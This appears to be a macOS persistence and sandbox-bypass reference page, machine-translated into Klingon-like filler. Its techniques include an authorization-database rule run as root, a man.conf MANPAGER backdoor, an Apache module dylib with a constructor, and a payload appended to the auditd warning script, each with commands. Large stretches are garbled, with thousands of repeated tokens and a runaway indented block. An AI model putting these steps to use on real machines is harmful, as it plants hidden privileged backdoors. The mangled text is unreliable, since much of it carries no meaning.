**ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** **`ghItlh`** **`authorization`** **`mechanism`** **`external`** **`call`** **`QaQ`**. **`privileged`** **`root`** **`ghItlh`** **`execute`** **`be`** **`QaQ`**.

**QaQ** **`trigger`** **`ghItlh`**.
```bash
security authorize com.asdf.asdf
```
### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root and the user must use man
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/private/etc/man.conf`**
* Root required
* **`/private/etc/man.conf`**: Whenever man is used

#### Description & Exploit

The config file **`/private/etc/man.conf`** indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.

For example set in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
'ej `/tmp/view` cha'logh:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root and apache needs to be running
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
* Httpd doesn't have entitlements

#### Location

* **`/etc/apache2/httpd.conf`**
* Root required
* Trigger: When Apache2 is started

#### Description & Exploit

You can indicate in `/etc/apache2/httpd.conf` to load a module adding a line such as:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Qapla'! jImejDaq 'ej Apache Daq yIlo'laHbe'. vaj 'ach **'oH 'e' vItlhutlh** 'ej, pagh **nIvbogh vItlhutlh** vay' system 'ej **'oH vItlhutlh** 'e' vItlhutlh.

vaj, vaj 'oH, server 'e' yIlo'laHbe' 'ej:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Code example for the Dylb:

```
Dylb-ghItlh:
    Dylb-ghItlh:
        Dylb-ghItlh:
            Dylb-ghItlh:
                Dylb-ghItlh:
                    Dylb-ghItlh:
                        Dylb-ghItlh:
                            Dylb-ghItlh:
                                Dylb-ghItlh:
                                    Dylb-ghItlh:
                                        Dylb-ghItlh:
                                            Dylb-ghItlh:
                                                Dylb-ghItlh:
                                                    Dylb-ghItlh:
                                                        Dylb-ghItlh:
                                                            Dylb-ghItlh:
                                                                Dylb-ghItlh:
                                                                    Dylb-ghItlh:
                                                                        Dylb-ghItlh:
                                                                            Dylb-ghItlh:
                                                                                Dylb-ghItlh:
                                                                                    Dylb-ghItlh:
                                                                                        Dylb-ghItlh:
                                                                                            Dylb-ghItlh:
                                                                                                Dylb-ghItlh:
                                                                                                    Dylb-ghItlh:
                                                                                                        Dylb-ghItlh:
                                                                                                            Dylb-ghItlh:
                                                                                                                Dylb-ghItlh:
                                                                                                                    Dylb-ghItlh:
                                                                                                                        Dylb-ghItlh:
                                                                                                                            Dylb-ghItlh:
                                                                                                                                Dylb-ghItlh:
                                                                                                                                    Dylb-ghItlh:
                                                                                                                                        Dylb-ghItlh:
                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Dylb-ghItlh:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Dylb-ghItlh:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root, auditd be running and cause a warning
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/etc/security/audit_warn`**
* Root required
* **Trigger**: When auditd detects a warning

#### Description & Exploit

Whenever auditd detects a warning the script **`/etc/security/audit_warn`** is **executed**. So you could add your payload on it.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` jImej.

### Startup Items

{% hint style="danger" %}
**qaStaHvIS, vaj 'e' vItlhutlh.**
{% endhint %}

**StartupItem** vItlhutlh `/Library/StartupItems/` vaj `/System/Library/StartupItems/` Daq vIlegh. vaj, vaj vItlhutlh, cha'logh **rc script** vaj `StartupParameters.plist` **plist file** vItlhutlh.

**StartupItem** vItlhutlhDaq **rc script** vaj `StartupParameters.plist` **plist file** vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq 